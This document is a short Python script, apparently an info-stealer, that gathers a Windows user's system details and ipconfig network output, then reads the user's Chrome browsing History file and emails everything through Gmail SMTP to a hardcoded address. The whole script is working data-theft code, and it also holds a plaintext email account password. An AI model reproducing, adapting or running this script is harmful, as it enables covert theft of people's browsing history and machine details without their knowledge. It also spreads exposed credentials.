import smtplib
import getpass
import subprocess
import platform
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
username = getpass.getuser()

my_system = platform.uname()

info1 = f"System is {my_system.system}"
info2 = f"Node Name is {my_system.node}"
info3 = f"Release is {my_system.release}"
info4 = f"Version is {my_system.version}"
info5 = f"Machine is {my_system.machine}"
info6 = f"Processor is {my_system.processor}"
ipINFO = subprocess.check_output("ipconfig").decode('utf-8')

info_alpha = f"{info1}\n{info2}\n{info3}\n{info4}\n{info5}\n{info6}\n{ipINFO}"


infoX = str(info_alpha).replace(":", ";")


mail_content = str(infoX)
sender_address = 'alliswell7778869@gmail.com'
sender_pass = 'sasorifeelnopain'
receiver_address = 'alliswell7778869@gmail.com'
message = MIMEMultipart()
message['From'] = sender_address
message['To'] = receiver_address
message['Subject'] = 'Data for Prophet'
message.attach(MIMEText(mail_content, 'plain'))
attach_file_name = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
attach_file = open(attach_file_name, 'rb')
payload = MIMEBase('application', 'octate-stream')
payload.set_payload((attach_file).read())
encoders.encode_base64(payload)
payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
message.attach(payload)
session = smtplib.SMTP('smtp.gmail.com', 587)
session.starttls()
session.login(sender_address, sender_pass)
text = message.as_string()
session.sendmail(sender_address, receiver_address, text)
session.quit()
print('Mail Sent')
